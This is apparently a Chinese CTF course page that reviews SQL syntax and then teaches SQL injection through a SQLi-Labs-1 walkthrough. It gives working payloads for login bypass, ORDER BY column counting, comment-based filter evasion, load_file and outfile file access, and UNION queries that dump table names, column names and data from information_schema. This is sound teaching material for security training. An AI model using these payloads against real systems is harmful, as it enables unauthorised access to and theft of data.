-<p><strong>注意 没有分号,这四行是一条完整的 SELECT 语句,换行只为了可读性</strong></p>
-<h4 id="INSERT-INTO"><a href="#INSERT-INTO" class="headerlink" title="INSERT INTO"></a>INSERT INTO</h4><p>INSERT INTO：用于向数据库表中插入新数据。</p>
-<p>INSERT INTO table_name (column1, column2, …)</p>
-<p>VALUES (value1, value2, …)</p>
-<ul>
-<li><code>table_name</code>: 要插入数据的表。</li>
-<li><code>column1, column2, ...</code>: 要插入数据的列。</li>
-<li><code>value1, value2, ...</code>: 对应列的值。</li>
-</ul>
-<h4 id="UPDATE"><a href="#UPDATE" class="headerlink" title="UPDATE"></a>UPDATE</h4><p>UPDATE：用于更新数据库表中的现有数据。</p>
-<p>UPDATE table_name</p>
-<p>SET column1 &#x3D; value1, column2 &#x3D; value2, …</p>
-<p>WHERE condition</p>
-<ul>
-<li><code>table_name</code>: 要更新数据的表。</li>
-<li><code>column1 = value1, column2 = value2, ...</code>: 要更新的列及其新值。</li>
-<li><code>condition</code>: 更新条件。</li>
-</ul>
-<h4 id="DELETE"><a href="#DELETE" class="headerlink" title="DELETE"></a>DELETE</h4><p>DELETE：用于从数据库表中删除数据。</p>
-<p>DELETE FROM table_name</p>
-<p>WHERE condition</p>
-<ul>
-<li><code>table_name</code>: 要删除数据的表。</li>
-<li><code>condition</code>: 删除条件。</li>
-</ul>
-<h3 id="数据库表的处理-创建-修改和删除"><a href="#数据库表的处理-创建-修改和删除" class="headerlink" title="数据库表的处理(创建 修改和删除)"></a>数据库表的处理(创建 修改和删除)</h3><h4 id="CREATE-TABLE"><a href="#CREATE-TABLE" class="headerlink" title="CREATE TABLE"></a>CREATE TABLE</h4><p>CREATE TABLE：用于创建新的数据库表。</p>
-<p>CREATE TABLE table_name (</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">column1 data_type constraint,</span><br><span class="line"></span><br><span class="line">column2 data_type constraint,</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-
-<p>)</p>
-<ul>
-<li><code>table_name</code>: 要创建的表名。</li>
-<li><code>column1, column2, ...</code>: 表的列。</li>
-<li><code>data_type</code>: 列的数据类型（如 <code>INT</code>、<code>VARCHAR</code> 等）。</li>
-<li><code>constraint</code>: 列的约束（如 <code>PRIMARY KEY</code>、<code>NOT NULL</code> 等）。</li>
-</ul>
-<h4 id="ALTER-TABLE"><a href="#ALTER-TABLE" class="headerlink" title="ALTER TABLE"></a>ALTER TABLE</h4><p>ALTER TABLE：用于修改(添加或者删除列)现有数据库表的结构。</p>
-<p>ALTER TABLE table_name</p>
-<p>ADD column_name data_type</p>
-<ul>
-<li><code>table_name</code>: 要修改的表。</li>
-<li><code>column_name</code>: 要添加的列。</li>
-<li><code>data_type</code>: 列的数据类型。</li>
-</ul>
-<p>或：</p>
-<p>ALTER TABLE table_name</p>
-<p>DROP COLUMN column_name</p>
-<ul>
-<li><code>column_name</code>: 要删除的列。</li>
-</ul>
-<h4 id="DROP-TABLE"><a href="#DROP-TABLE" class="headerlink" title="DROP TABLE"></a>DROP TABLE</h4><p>DROP TABLE：用于删除数据库表。</p>
-<p>DROP TABLE table_name</p>
-<ul>
-<li><code>table_name</code>: 要删除的表。</li>
-</ul>
-<h3 id="索引的操作"><a href="#索引的操作" class="headerlink" title="索引的操作"></a>索引的操作</h3><h4 id="CREATE-INDEX"><a href="#CREATE-INDEX" class="headerlink" title="CREATE INDEX"></a>CREATE INDEX</h4><p>CREATE INDEX：用于创建索引，以加快查询速度。</p>
-<p>CREATE INDEX index_name</p>
-<p>ON table_name (column_name)</p>
-<ul>
-<li><code>index_name</code>: 索引的名称。</li>
-<li><code>column_name</code>: 要索引的列。</li>
-</ul>
-<h4 id="DROP-INDEX"><a href="#DROP-INDEX" class="headerlink" title="DROP INDEX"></a>DROP INDEX</h4><p>DROP INDEX：用于删除索引。</p>
-<p>DROP INDEX index_name</p>
-<p>ON table_name</p>
-<ul>
-<li><code>index_name</code>: 要删除的索引名称。</li>
-<li><code>table_name</code>: 索引所在的表。</li>
-</ul>
-<h3 id="其他指令"><a href="#其他指令" class="headerlink" title="其他指令"></a>其他指令</h3><h4 id="WHERE"><a href="#WHERE" class="headerlink" title="WHERE"></a>WHERE</h4><p>WHERE：用于指定筛选条件。</p>
-<p>SELECT column_name(s)</p>
-<p>FROM table_name</p>
-<p>WHERE condition</p>
-<ul>
-<li><code>condition</code>: 筛选条件。</li>
-</ul>
-<p>例如 列名 &#x3D; … 等</p>
-<h4 id="ORDER-BY"><a href="#ORDER-BY" class="headerlink" title="ORDER BY"></a>ORDER BY</h4><p>ORDER BY：用于对结果集进行排序。</p>
-<p>SELECT column_name(s)</p>
-<p>FROM table_name</p>
-<p>ORDER BY column_name [ASC|DESC]</p>
-<ul>
-<li><code>column_name</code>: 用于排序的列。</li>
-<li><code>ASC</code>: 升序（默认）。</li>
-<li><code>DESC</code>: 降序。</li>
-</ul>
-<p>例如</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT column1, column2, ... FROM table_name [WHERE condition] ORDER BY column_name [ASC|DESC];</span><br></pre></td></tr></table></figure>
-
-<p>其中，column1、column2 等表示要查询的列名，table_name 表示要查询的表名，condition  表示查询条件，column_name 表示要按照哪一列进行排序，ASC 或 DESC  表示升序或降序排列。可以使用多个列名来进行排序，多个列名之间用逗号分隔。</p>
-<p>注意:<strong>在 SQL 注入中我们常用它来判断列数</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT column1, column2 FROM table_name [WHERE condition] ORDER BY 1;# 不报错</span><br><span class="line">SELECT column1, column2 FROM table_name [WHERE condition] ORDER BY 2;# 不报错</span><br><span class="line">SELECT column1, column2 FROM table_name [WHERE condition] ORDER BY 3;# 报错</span><br></pre></td></tr></table></figure>
-
-<h4 id="GROUP-BY"><a href="#GROUP-BY" class="headerlink" title="GROUP BY"></a>GROUP BY</h4><p>GROUP BY：用于将结果集按一列或多列进行分组。</p>
-<p>SELECT column_name(s), aggregate_function(column_name)</p>
-<p>FROM table_name</p>
-<p>WHERE condition</p>
-<p>GROUP BY column_name(s)</p>
-<ul>
-<li><code>aggregate_function</code>: 聚合函数（如 COUNT、SUM、AVG 等）。</li>
-</ul>
-<h4 id="HAVING"><a href="#HAVING" class="headerlink" title="HAVING"></a>HAVING</h4><p>HAVING：用于对分组后的结果集进行筛选。</p>
-<p>SELECT column_name(s), aggregate_function(column_name)</p>
-<p>FROM table_name</p>
-<p>GROUP BY column_name(s)</p>
-<p>HAVING condition</p>
-<ul>
-<li><code>condition</code>: 筛选条件。</li>
-</ul>
-<h4 id="JOIN"><a href="#JOIN" class="headerlink" title="JOIN"></a>JOIN</h4><p>JOIN：用于将两个或多个表的记录结合起来。</p>
-<p>SELECT column_name(s)</p>
-<p>FROM table_name1</p>
-<p>JOIN table_name2</p>
-<p>ON table_name1.column_name &#x3D; table_name2.column_name</p>
-<ul>
-<li><code>JOIN</code>: 可以是 INNER JOIN、LEFT JOIN、RIGHT JOIN 或 FULL JOIN。</li>
-</ul>
-<h4 id="DISTINCT"><a href="#DISTINCT" class="headerlink" title="DISTINCT"></a>DISTINCT</h4><p>DISTINCT：用于返回唯一不同的值。</p>
-<p>SELECT DISTINCT column_name(s)</p>
-<p>FROM table_name</p>
-<ul>
-<li><code>column_name(s)</code>: 要查询的列。</li>
-</ul>
-<h4 id="LIMIT"><a href="#LIMIT" class="headerlink" title="*LIMIT"></a>*LIMIT</h4><p><code>LIMIT</code> 限制返回的记录数量</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#返回表中前number行数据</span><br><span class="line">SELECT column1, column2, ... FROM table_name LIMIT number;</span><br><span class="line">#从offset+1行开始返回row_count行数据</span><br><span class="line">SELECT column1, column2, ... FROM table_name LIMIT offset, row_count;</span><br><span class="line">#比如 LIMIT 10, 10 返回11-20行数据</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM table_name ORDER BY column_name DESC LIMIT 10;</span><br></pre></td></tr></table></figure>
-
-<h4 id="UNION"><a href="#UNION" class="headerlink" title="*UNION"></a>*UNION</h4><ul>
-<li><code>UNION</code> 用于合并两个或多个 SELECT 语句的结果集</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT 列名 FROM 表名UNIONSELECT 列名_1 FROM 表名_1;</span><br></pre></td></tr></table></figure>
-
-<p>注意：使用 <code>UNION</code> 的时候要注意两个表的列数量必须相同。</p>
-<h3 id="注释"><a href="#注释" class="headerlink" title="*注释"></a>*注释</h3><ul>
-<li><code>注释</code></li>
-</ul>
-<p><code>--</code> 这是一个单行注释。注意，<code>--</code> 后必须加一个空格或者加号，注释才会生效，所以一般用–+ + 表示空格</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = ((1)) union select username,password from user;-- )) limit1,1;后面的内容都将被注释</span><br></pre></td></tr></table></figure>
-
-<p><code>#</code> 是另一种单行注释</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DROP sampletable;# 后面的内容都将被注释</span><br></pre></td></tr></table></figure>
-
-<p>多行注释使用 <code>/*</code> 和 <code>*/</code> 包裹注释内容，可以跨多行书写</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DROP/*comment*/sampletable`   DR/**/OP/*绕过过滤*/sampletable`    SELECT/*替换空格*/password/**/FROM/**/Members #/**/可用于替换空格/*中间的内容都将被注释*/</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT /*!32302 1/0, */ 1 FROM tablename #这种 /*! 注释仅在MySQL中存在，在其他数据库中会被忽略</span><br></pre></td></tr></table></figure>
-
-<h3 id="常用参数"><a href="#常用参数" class="headerlink" title="*常用参数"></a>*常用参数</h3><p>常用参数：</p>
-<ul>
-<li><code>user()</code>：当前数据库用户</li>
-<li><code>database()</code>：当前数据库名</li>
-<li><code>version()</code>：当前使用的数据库版本</li>
-<li><code>@@datadir</code>：数据库存储数据路径</li>
-<li><code>concat()</code>：联合数据，用于联合两条数据结果。如 <code>concat(username,0x3a,password)</code></li>
-<li><code>group_concat()</code>：和 <code>concat()</code> 类似，如 <code>group_concat(DISTINCT+user,0x3a,password)</code>，用于把多条数据一次注入出来</li>
-<li><code>concat_ws()</code>：用法类似</li>
-<li><code>hex()</code> 和 <code>unhex()</code>：用于 hex 编码解码</li>
-<li><code>ASCII()</code>：返回字符的 ASCII 码值</li>
-<li><code>CHAR()</code>：把整数转换为对应的字符</li>
-<li><code>load_file()</code>：以文本方式读取文件，在 Windows 中，路径设置为 <code>\\</code></li>
-<li><code>select xxoo into outfile &#39;路径&#39;</code>：权限较高时可直接写文件</li>
-</ul>
-<h1 id="Week4-2-SQL-注入"><a href="#Week4-2-SQL-注入" class="headerlink" title="[Week4.2]SQL 注入"></a>[Week4.2]SQL 注入</h1><h2 id="概论-1"><a href="#概论-1" class="headerlink" title="概论"></a>概论</h2><h3 id="含义"><a href="#含义" class="headerlink" title="含义"></a>含义</h3><p><strong>SQL 注入</strong>是 CTF web 中最常见的漏洞之一，是攻击者通过输入特殊构造的字符串，篡改后端 SQL 查询语句，从而实现未授权操作的漏洞。</p>
-<h3 id="核心原理"><a href="#核心原理" class="headerlink" title="核心原理"></a>核心原理</h3><ol>
-<li>程序未对用户输入做严格过滤，直接将输入拼接到 SQL 语句中。</li>
-<li>攻击者利用引号、注释符等 SQL 语法，改变原查询的逻辑（比如绕开登录验证、查询敏感数据）。</li>
-<li>后端数据库执行了被篡改的恶意 SQL 语句，返回攻击者需要的结果。</li>
-</ol>
-<h3 id="简单示例"><a href="#简单示例" class="headerlink" title="简单示例"></a>简单示例</h3><p>假设登录功能的后端 SQL 语句是：<code>select * from user where username=&#39;用户输入&#39; and password=&#39;用户输入&#39;</code></p>
-<ul>
-<li>正常输入：用户名 <code>admin</code>、密码 <code>123</code>，SQL 语句正常执行，验证账号密码。</li>
-<li>注入输入：用户名 <strong>admin’ –</strong>、密码任意，拼接后 SQL 变成 <code>select * from user where username=&#39;admin&#39; --&#39; and password=&#39;任意&#39;</code>。</li>
-<li>其中 <code>&#39;</code> 闭合前面的引号，<code>--</code> 是 SQL 注释符，后面的内容被忽略，最终直接查询 <code>username=&#39;admin&#39;</code> 的用户，绕开密码验证。</li>
-</ul>
-<h3 id="常见危害"><a href="#常见危害" class="headerlink" title="常见危害"></a>常见危害</h3><ul>
-<li>读取数据库敏感数据（比如用户账号密码、flag）。</li>
-<li>篡改数据库内容（修改密码、插入恶意数据）。</li>
-<li>甚至通过高阶注入获取服务器权限。</li>
-</ul>
-<h3 id="SELECT-函数预备知识"><a href="#SELECT-函数预备知识" class="headerlink" title="SELECT 函数预备知识"></a>SELECT 函数预备知识</h3><p>SELECT 既可以查询列的内容,还可以查询函数的返回值,也可以直接查询并返回字符串.</p>
-<p><code>因为 SELECT</code> 核心能力就是 “查询并返回数据”，而数据的来源可以是 <strong>表的列、函数返回值、直接写的常量（字符串、数字等）</strong></p>
-<h2 id="基础注入类型"><a href="#基础注入类型" class="headerlink" title="基础注入类型"></a>基础注入类型</h2><p>按照查询字段分类，可以分为字符型(当输入的参数为字符串时，称为字符型注入)和数字型(当输入的参数为整形时，称为数字型注入)</p>
-<p>按照注入方法，又可以分为 Union 注入，报错注入，布尔注入，时间注入等</p>
-<p><strong>注入点</strong>：可以实行注入的地方，通常是一个访问数据库的连接。例如用 post&#x2F;get 提交一个变量的值</p>
-<p><strong>实战中我们要推断 get 变量前面的数据库指令，以达成目标</strong></p>
-<p><strong>对于基础的 SQL 注入，大致分为找到注入点，判断注入的类型和闭合方式，判断数据库表的列数，用 union 指令</strong></p>
-<p><strong>输出同列数的数据库表，找到回显位并获取信息(具体可看文后的解题步骤).</strong></p>
-<p>注:有的时候页面只能显示一个内容，第二句的内容是不显示的，</p>
-<p>可以把第一句的内容改为数据库不存在的数据，如 id&#x3D;0。</p>
-<p><img src="/images/Qt85brpF2oeKbdxjo4WcFAW9n4N.png"></p>
-<h3 id="判断数字型-字符型注入"><a href="#判断数字型-字符型注入" class="headerlink" title="判断数字型&#x2F;字符型注入"></a>判断数字型&#x2F;字符型注入</h3><p>数字型和字符型的最本质区别就是变量的值是否被单&#x2F;双引号闭合.</p>
-<h4 id="方法一-使用-and-1-1-and-1-2-进行判断"><a href="#方法一-使用-and-1-1-and-1-2-进行判断" class="headerlink" title="方法一 使用 and 1&#x3D;1&#x2F;and 1&#x3D;2 进行判断"></a>方法一 使用 and 1&#x3D;1&#x2F;and 1&#x3D;2 进行判断</h4><p>例如你要 get: ?id&#x3D;1</p>
-<p>为了判断输入的 1 是数字型还是字符型，你可以在 1 后面添加 and 1&#x3D;1 和 and 1&#x3D;2</p>
-<p>添加 and 1&#x3D;1 时，字符型和数字型都可以执行后续的命令</p>
-<p>但是添加 and 1&#x3D;2 时，只有字符型可以执行 get 以后的命令，因为数字型不带引号，将 and 1&#x3D;2 视为本句话内额外的命令，and 1&#x3D;2 返回的是 false，后续的指令将无法执行.</p>
-<h4 id="方法二-使用带减号的运算表达式进行判断"><a href="#方法二-使用带减号的运算表达式进行判断" class="headerlink" title="方法二 使用带减号的运算表达式进行判断"></a><strong>方法二 使用带减号的运算表达式进行判断</strong></h4><p>若为数字型，get：?id&#x3D;2-1 会等价于 id&#x3D;1</p>
-<p>若为字符型则不会执行 id&#x3D;1 的操作.</p>
-<h3 id="判断闭合方式"><a href="#判断闭合方式" class="headerlink" title="判断闭合方式"></a>判断闭合方式</h3><p>运用<strong>构造闭合</strong>的方法，进行注入类型判断</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = ?</span><br></pre></td></tr></table></figure>
-
-<p>这里的问号可以有多种的闭合方式, <code>$id</code>, <code>&#39;$id&#39;</code>, <code>&quot;$id&quot;</code>, <code>($id)</code>,(“”),(‘’)等。</p>
-<p>比如后台为:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = &quot;$id&quot;</span><br></pre></td></tr></table></figure>
-
-<p>那么我们使传入的 $id &#x3D; ‘1”‘, 那么后台执行则为</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = &quot;1&quot; &quot;</span><br></pre></td></tr></table></figure>
-
-<p>在这里我们对 1 完成了闭合构造，但是我们闭合了前序导致后续的 <code>&quot;</code> 没有双引号配对，多出来的这个双引号则会导致报错：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1064 - You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&quot;&#x27; at line 1</span><br></pre></td></tr></table></figure>
-
-<p>所以我们通常在构造完闭合后去注释掉后面的符号，比如使用 <code>#</code> <code>--</code></p>
-<p>上面是白盒下面很直观的版本，但是大多数情况下，<strong>SQL 注入都是黑盒</strong>，我们不知道后台到底是怎么写的，<strong>所以我们需要一些判断的方法或者技巧</strong>。</p>
-<h4 id="通过是否报错"><a href="#通过是否报错" class="headerlink" title="通过是否报错"></a><strong>通过是否报错</strong></h4><p>比如，我们使用 <code>1&#39;</code> 进行试探:</p>
-<h4 id="通过报错信息"><a href="#通过报错信息" class="headerlink" title="通过报错信息"></a><strong>通过报错信息</strong></h4><blockquote>
-<p>注：我们省略了部分语句和相同的报错，实战中只要看表中出现的不同报错就行了。<br><code>SELECT username,password FROM users WHERE id = &quot;1&quot;&quot;;</code>  -&gt; id&#x3D;xx<br><code>You have an error in your SQL syntax; check the manual that  corresponds to your MySQL server version for the right syntax to use  near &#39;1&#39;&#39; at line 1</code><br>-&gt; <code>near &#39;1&#39;&#39; at line 1</code></p>
-</blockquote>
-<p>这里 near 后的字符自带单引号，要去除掉,去除后就是后台报错的解释</p>
-<h3 id="寻找回显位-见-SQLi-Labs-1-解题"><a href="#寻找回显位-见-SQLi-Labs-1-解题" class="headerlink" title="寻找回显位(见 SQLi-Labs-1 解题)"></a>寻找回显位(见 SQLi-Labs-1 解题)</h3><p><strong>下面，将按点展开阐述不同注入方法的注入过程</strong></p>
-<h2 id="字符型-UNION-注入"><a href="#字符型-UNION-注入" class="headerlink" title="字符型 UNION 注入"></a>字符型 UNION 注入</h2><p>最终目标:使用 union 注入拿到靶机中数据库里的所有用户名和密码。</p>
-<p><em>注:使用不同的注入方法时，基本的步骤还是保持不变</em></p>
-<p><strong>找到注入点，判断注入的类型和闭合方式，判断数据库表的列数，用 union 指令</strong></p>
-<p><strong>输出同列数的数据库表，找到回显位并获取信息</strong></p>
-<h3 id="拿到表名和列名"><a href="#拿到表名和列名" class="headerlink" title="拿到表名和列名"></a>拿到表名和列名</h3><p>想要拿到表名和列名，首先要知道他们存放在哪里</p>
-<p>在 mysql 中，有一个名为 information_schema 的数据库，里面包含所有 mysql 数据库的简要信息</p>
-<p>而其中包含两个存放表名和列名的数据表.</p>
-<p>_tips:<strong>database()</strong>：当前数据库名_</p>
-<p><img src="/images/DGHpbtvLGoDprTxK2gqcF7t4nKb.png"></p>
-<p>表名集合表中，列名为”table_name”的一列存放着所有的<strong>表名</strong>，而列名为”table_schema”的一列存放着这个表所属的<strong>数据库名</strong></p>
-<p><em>注:引用非当前数据库的表名要用 &lt; 数据库名 &gt;.&lt; 表名 &gt; 实现</em></p>
-<p><img src="/images/D2PYbxfExoZ6iQxtGwncImPtnOf.png"></p>
-<p>这行代码，可以利用数据库 information_schema 中的 tables 表名集合表，来获得 security 数据库中的表名.</p>
-<p>若不清楚你需要的数据库名为什么，就使用 table_schema&#x3D;database(),注意不用加引号</p>
-<p><em>注:拿到列名，和拿到表名的流程是一样的，这里不再赘述,把表名改成 column 而非 table 即可</em></p>
-<p><em>而在表 information_schema.colulumn 中，column_name 代表列名，但还是有 table_name 这一列，代表所在的表名，和 table_schema 这一列，代表所在的数据库名</em></p>
-<p><img src="/images/DUZibdAo7oE0vuxv7MycAR58nwb.png"></p>
-<p>用 and 连接两个条件，可以既限制数据库名，又限制表名来获得正确的列名</p>
-<p>这里为什么知道需要的表名为 users 呢?是因为我们通过查询当前数据库下所有的表名逐个推断出来的，可以查询多个表名，看看哪个表中有用户名和密码这两列,再进入下一个步骤</p>
-<h3 id="解决回显位只能显示一个数据的问题"><a href="#解决回显位只能显示一个数据的问题" class="headerlink" title="解决回显位只能显示一个数据的问题"></a>解决回显位只能显示一个数据的问题</h3><p>解决这个问题需要使用 group_concat()函数.</p>
-<p>group_concat(&lt; 列名 &gt;)的返回值仍为本列，但若用 group_concat(&lt; 列名 &gt;)代替 &lt; 列名 &gt; 放入 select 函数，select 就会输出 &lt; 数据 1&gt;,&lt; 数据 2&gt;……为一个数据正如:</p>
-<p><img src="/images/XxuebGLIuoXkYDxmXuccv7kgn57.png"></p>
-<p>而非只输出 emails</p>
-<h3 id="查询最终目标"><a href="#查询最终目标" class="headerlink" title="查询最终目标"></a>查询最终目标</h3><p>知道了需要的表名和列名以后，再用 group_concat()来查询最终的目标，在这里是用户名和密码</p>
-<p>我们输入</p>
-<p><img src="/images/ZearbzMB2oR0h5xgoTGc70ZPncd.png"></p>
-<p>用 group_concat 同时输出两列的内容，中间用分隔符~连接，即可获得所有的用户名和密码</p>
-<p>这里的 users 和 username,password 都是通过查询 information_schema 数据库中的内容获取的</p>
-<p><em>注:这样便说明了 group_concat(多个列名相连接)可以用 SELECT 函数和一列的空间输出两列的内容,</em></p>
-<p><em>而非 ORDER BY 几就输出几列.</em></p>
-<h3 id="SQLi-Labs-1-解题示例"><a href="#SQLi-Labs-1-解题示例" class="headerlink" title="SQLi-Labs-1 解题示例"></a>SQLi-Labs-1 解题示例</h3><p>SQLi-Labs-1 是一道最基础的 union 题，我们再复习一遍解题的流程</p>
-<p><img src="/images/XUyibqmrdojcIOxObOdcylPKn7b.png"></p>
-<h4 id="1-查找注入点"><a href="#1-查找注入点" class="headerlink" title="1.查找注入点"></a>1.查找注入点</h4><p><img src="/images/M9anbtKV3o4s1YxEIV5cG9IBnHe.png"></p>
-<p>注意到本题提示需要你输入 id，又没有输入的窗口，于是尝试 post id&#x3D;1 和 get id&#x3D;1</p>
-<p>发现 get id&#x3D;1 让网页有了回显，这样便发现了这么一个注入点.</p>
-<p><img src="/images/HV1abjyhYoi37ixxUcccLqC5nqn.png"></p>
-<p><img src="/images/APiXbwAe6oohRcxmztmcwbkYn4W.png"><br><img src="/images/AKJKbG3ypos6K4xan3rcm6z0nmG.png"><br>尝试更换几个数字，发现 login name 和 password 一直在变，说明这是一个数据库表的某两列</p>
-<h4 id="2-判断注入类型-字符型-数字型"><a href="#2-判断注入类型-字符型-数字型" class="headerlink" title="2.判断注入类型(字符型&#x2F;数字型)"></a>2.判断注入类型(字符型&#x2F;数字型)</h4><p>这里 get 一个?id&#x3D;3-2,他的回显并不是 id&#x3D;1 的回显,故认为是字符型.</p>
-<p><img src="/images/SzGZbDPi4oj0OIxLjsncp0ovnld.png"></p>
-<h4 id="3-找到闭合方式"><a href="#3-找到闭合方式" class="headerlink" title="3.找到闭合方式"></a>3.找到闭合方式</h4><p><img src="/images/ZLJjb9TtPo5ksAxKjtlcKf1Unkg.png"></p>
-<p>先试了试双引号,发现并没有报错,如果闭合方式是双引号,那他包会报错的,因为你提前闭合了,那就是单引号了,我们可以验证一下: get: ?id&#x3D;’1</p>
-<p><img src="/images/HhQRbKyL8o5HaDxmAE3cC33nnKd.png"></p>
-<p>先排除一下 near 后和 at 前的第一个单引号，这作为报错的引用号，不是代码里的内容</p>
-<p>真正报错的内容是:</p>
-<p>1’LIMIT 0,1</p>
-<p><em>LIMIT 是限制回显的行，这里是返回 0 到 1 行的数据</em></p>
-<p><em>这个我们可以不管，因为在这里真正限制回显的是</em><strong>回显位，而不是 LIMIT</strong></p>
-<p>实际上这原本是:</p>
-<p>**’****’<strong>1</strong>‘**LIMIT 0,1</p>
-<p>黄底的单引号直接空引用视为空了</p>
-<p>而代表闭合方式的单引号是红色的</p>
-<p>如果我们 get 的是 1,那肯定正常运行了,实际的后半段代码是</p>
-<p>‘1’LIMIT 0,1</p>
-<p>或者再试试 1’,发现 1’直接被单引号包裹了</p>
-<p><img src="/images/S2qybJcijoaLfNxBKhLcJ2g1nsg.png"></p>
-<p>也能直接判断闭合方式就是单引号</p>
-<h4 id="4-判断查询列数"><a href="#4-判断查询列数" class="headerlink" title="4.判断查询列数"></a>4.判断查询列数</h4><p>我们这里是 UNION 注入,UNION 前后的 SELECT 要求列数是相同的,先看看前面的 SELECT(要你填 id 的 SELECT)查了几列(查了几列和 LIMIT”要查几行”和回显都没有关系,最终回显的东西是看回显位,这里是为了让 UNION 结构正常运行)</p>
-<p>我们采用 ORDER BY &lt; 列数 &gt; 调试一下,注意末尾加个–+,+ 代表空格注释掉后面可能有的对于原指令的限制条件，以让 ORDER BY 正常执行</p>
-<p><img src="/images/L8meb4D39oBiXMx7bp8cFrLanNc.png"></p>
-<p><img src="/images/ObedbqB8hoqRoqxQZ6lcqCEJnOh.png"></p>
-<p>这里尝试了一下 ORDER BY 1-4，发现恰好在 3 这里可以执行，说明前面的 SELECT,他查询了三列,我们后面的 UNION 也要是三列</p>
-<h4 id="5-找到回显位"><a href="#5-找到回显位" class="headerlink" title="5.找到回显位"></a>5.找到回显位</h4><p>既然 SELECT 他查询了三列,但是 Your Login name 和 Password 他只显示两列的内容，而且只有一个数据(因为列名并没有被 group_concat()包裹)，那不妨看看他会显示 UNION 后的(我们可操控的)哪两列.</p>
-<p><img src="/images/Bk24bH0bZof4iIxQreUc8UnPniA.png"></p>
-<p>直接输列名 1,2,3 不加 FROM,他应该会直接返回数字 1,2,3;</p>
-<p>这里让 id&#x3D;-1,让 UNION 前面的查询无效,避免回显位仍显示 UNION 前正常的内容</p>
-<p>发现回显了 2,3,发现 UNION 后,SELECT 的第二个和第三个列是有用的(会产生回显的)</p>
-<p>随后我们要查询的列，就放在 SELECT 的第二个或第三个位置</p>
-<h4 id="6-查询表名和列名"><a href="#6-查询表名和列名" class="headerlink" title="6.查询表名和列名"></a>6.查询表名和列名</h4><p>下一步按道理是获取全部人的用户名和密码,我们需要找到用户名和密码所在的数据库表和真正的列名，并使用 group_concat()让他们一一回显.</p>
-<p>先查询表名,payload:</p>
-<p>?id&#x3D;-1’ UNION SELECT 1,group_concat(TABLE_NAME),3 FROM information_schema.tables WHERE table_schema&#x3D;database()–+</p>
-<p>这里查询的是当前数据库即 database()函数返回的数据库中的所有表名</p>
-<p>其作为一个列存放于数据库 information_schema 中的一个表 tables</p>
-<p><img src="/images/LLlVbjCCXomHFsxlfS7cVjcvnPb.png"></p>
-<p>看到了竟然有一个表叫 flag,那 flag 估计在这个表里，不是在获取所有用户名和密码的时候回显…</p>
-<p>那再查询列名,看看表 flag 里面有哪些列,payload:</p>
-<p>?id&#x3D;-1’ UNION SELECT 1,group_concat(COLUMN_NAME),3 FROM information_schema.columns WHERE table_schema&#x3D;database() and table_name&#x3D;’flag’ –+</p>
-<p>这里查询的是 database()返回的数据中,表’flag’中的全部列名(两个条件用 and 连接,注意 table_name 代表你想查询的列所在的表,加<strong>单引号</strong>表示字符串)</p>
-<p><img src="/images/HR1wbYDQTozhCpxXAOwcVOS7nVd.png"></p>
-<p>回显就两列,id 和 flag,看看这两列呗</p>
-<h4 id="7-得到答案"><a href="#7-得到答案" class="headerlink" title="7.得到答案"></a>7.得到答案</h4><p>payload:?id&#x3D;-1’ UNION SELECT 1,group_concat(FLAG),3 FROM FLAG–+</p>
-<p><img src="/images/PNxMbXs3JoH5Bbx072sctFC4nDb.png"></p>
-<p>发现表名好像区分大小写(?)</p>
-<p>并且发现了 <strong>FROM 一个不存在的表名,好像就能看到 database()返回的数据库名了</strong></p>
-<p>修改一下准确的大小写</p>
-<p>payload:?id&#x3D;-1’ UNION SELECT 1,group_concat(flag),3 FROM flag–+</p>
-<p><img src="/images/DYScbC3PWoxuFKxRX3Jc8og7nwf.png"></p>
-<p>那答案就出来了.</p>
-<h2 id="数字型-UNION-注入"><a href="#数字型-UNION-注入" class="headerlink" title="数字型 UNION 注入"></a>数字型 UNION 注入</h2><p>数字型注入比字符型更容易,以上一题为例,在 payload: ?id&#x3D;2-1 的时候能输出 id&#x3D;1 时的用户名和密码,就为数字型注入.不用找到闭合方式，直接往下判断查询列数就可以了.</p>
-<p>Payload: ?id&#x3D;1 GROUP BY 4 –+ 这样</p>
-<p>查询表名的时候:</p>
-<p>?id&#x3D;-1’ UNION SELECT 1,group_concat(TABLE_NAME),3 FROM information_schema.tables WHERE table_schema&#x3D;database()–+</p>
